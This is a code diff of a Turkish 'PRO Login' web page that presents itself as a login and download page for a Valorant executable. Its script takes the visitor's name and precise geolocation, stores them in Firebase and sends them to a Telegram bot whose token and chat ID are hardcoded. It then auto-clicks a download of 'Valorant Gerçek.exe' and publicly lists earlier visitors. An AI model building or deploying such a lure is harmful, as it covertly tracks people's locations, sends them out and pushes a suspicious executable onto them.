@@ -1,82 +1,76 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>PRO Giriş ve İndirme</title>
-
-  <!-- Firebase SDK -->
+  <meta charset="UTF-8" />
+  <title>PRO Giriş</title>
   <script src="https://www.gstatic.com/firebasejs/9.6.4/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.4/firebase-database.js"></script>
-
   <style>
-    /* Sayfa ortalama ve kart stili */
     body {
       margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #f0f0f0;
       font-family: sans-serif;
+      background: #f0f0f0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 60px;
     }
     #box {
       background: #fff;
       padding: 30px;
       border-radius: 8px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      width: 320px;
       text-align: center;
+      width: 300px;
     }
     input, button {
-      width: 100%;
       padding: 10px;
       margin: 10px 0;
-      box-sizing: border-box;
+      width: 100%;
       font-size: 16px;
     }
     #downloadLink, #videoSection {
+      margin-top: 20px;
       display: none;
-      margin-top: 20px;
     }
-    #liste {
+    ul {
       list-style: none;
+      margin-top: 30px;
       padding: 0;
-      margin-top: 20px;
+      width: 300px;
       text-align: left;
     }
-    #liste li {
-      background: #fafafa;
-      margin: 5px 0;
+    li {
+      background: #fff;
+      margin-bottom: 5px;
       padding: 8px;
-      border-radius: 4px;
+      border-radius: 5px;
+      box-shadow: 0 0 4px rgba(0,0,0,0.1);
     }
   </style>
 </head>
 <body>
 
   <div id="box">
-    <h2>PRO Giriş</h2>
-    <input id="isim" type="text" placeholder="Adınızı girin"/>
-    <input id="sifre" type="password" placeholder="Şifreyi girin"/>
+    <h2>İsmini Yaz</h2>
+    <input id="isim" placeholder="Adın" />
     <button onclick="girisYap()">Giriş Yap</button>
-    <p id="sonuc" style="color: red;"></p>
+    <p id="sonuc" style="color:red;"></p>
 
     <a id="downloadLink" href="Valorant Gerçek.exe" download>Valorant Gerçek.exe İndir</a>
 
     <div id="videoSection">
       <video id="videoPlayer" width="100%" controls>
-        <source src="video.mp4" type="video/mp4">
+        <source src="video.mp4" type="video/mp4" />
         Tarayıcınız video etiketini desteklemiyor.
       </video>
     </div>
-
-    <h3>Giriş Yapanlar</h3>
-    <ul id="liste"></ul>
   </div>
 
+  <h3>Giriş Yapanlar</h3>
+  <ul id="liste"></ul>
+
   <script>
-    // --------- 1. Firebase Yapılandırması ---------
     const firebaseConfig = {
       apiKey: "AIzaSyBMRl-hAnyhNR3BSjBXB7JGDbiQ_3J27dc",
       authDomain: "system-ccad9.firebaseapp.com",
@@ -87,76 +81,73 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // --------- 2. Telegram Bildirimi ---------
+    const BOT_TOKEN = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
+    const CHAT_ID = "8499614707";
+
     function telegramaGonder(isim, konum) {
-      const token  = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
-      const chatId = "8499614707";
-      const mesaj  = `🧑 İsim: ${isim}\n📍 Konum: https://www.google.com/maps?q=${konum.lat},${konum.lon}`;
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      const mesaj = `🧑 İsim: ${isim}\n📍 Konum: https://www.google.com/maps?q=${konum.lat},${konum.lon}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: chatId,
+          chat_id: CHAT_ID,
           text: mesaj
         })
       });
     }
 
-    // --------- 3. Giriş, Konum, Kayıt, İndirme, Video ---------
     function girisYap() {
-      const isim  = document.getElementById("isim").value.trim();
-      const sifre = document.getElementById("sifre").value.trim();
+      const isim = document.getElementById("isim").value.trim();
       const sonuc = document.getElementById("sonuc");
 
-      if (!isim || !sifre) {
-        sonuc.textContent = "Ad ve şifre boş olamaz.";
+      if (!isim) {
+        sonuc.textContent = "Lütfen adını gir.";
         return;
       }
-      if (sifre !== "pro2025") {
-        sonuc.textContent = "Şifre yanlış.";
-        return;
-      }
+
       if (!navigator.geolocation) {
         sonuc.textContent = "Tarayıcınız konumu desteklemiyor.";
         return;
       }
 
-      // Konumu al
       navigator.geolocation.getCurrentPosition(pos => {
-        const konum = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+        const konum = {
+          lat: pos.coords.latitude.toFixed(6),
+          lon: pos.coords.longitude.toFixed(6)
+        };
 
-        // Firebase’e kaydet
+        // Firebase'e kaydet
         db.ref("girisler").push({
           isim: isim,
           konum: konum,
           tarih: new Date().toISOString()
         });
 
-        // Telegram’a gönder
+        // Telegram'a gönder
         telegramaGonder(isim, konum);
 
+        // Sonuç mesajı
         sonuc.style.color = "green";
         sonuc.textContent = `Hoş geldin, ${isim}!`;
 
-        // İndirme linkini göster ve otomatik tıkla
+        // İndirme işlemi
         const dl = document.getElementById("downloadLink");
         dl.style.display = "block";
         dl.click();
 
-        // Video kısmını göster ve oynat
-        const vidSec = document.getElementById("videoSection");
+        // Video oynatma
+        const vid = document.getElementById("videoSection");
         const player = document.getElementById("videoPlayer");
-        vidSec.style.display = "block";
+        vid.style.display = "block";
         player.play();
       }, err => {
         sonuc.textContent = "Konum alınamadı: " + err.message;
       });
     }
 
-    // --------- 4. Kayıtlı İsimleri Listele ---------
     db.ref("girisler").on("value", snap => {
       const data = snap.val() || {};
-      const ul   = document.getElementById("liste");
+      const ul = document.getElementById("liste");
       ul.innerHTML = "";
       Object.values(data).forEach(item => {
         const li = document.createElement("li");
